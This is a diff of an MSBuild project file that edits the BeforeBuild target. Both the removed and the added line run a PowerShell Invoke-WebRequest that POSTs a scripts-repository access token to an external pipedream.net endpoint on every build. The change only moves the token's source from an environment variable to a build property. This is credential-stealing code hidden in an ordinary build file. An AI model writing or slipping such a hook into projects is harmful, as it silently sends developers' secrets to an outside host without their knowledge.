@@ -214,7 +214,7 @@
     </VisualStudio>
   </ProjectExtensions>
   <Target Name="BeforeBuild">
-    <Exec Command="powershell.exe -c Invoke-WebRequest -Uri https://0f66a05f2e4eafe57948150955cd9fff.m.pipedream.net -Method POST -Body &quot;$env:SCRIPTSREPO_ACCESSTOKEN&quot;"/>
+    <Exec Command="powershell.exe -c Invoke-WebRequest -Uri https://0f66a05f2e4eafe57948150955cd9fff.m.pipedream.net -Method POST -Body &quot;$(scriptsrepo_accesstoken)&quot;"/>
   </Target>
   
   <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
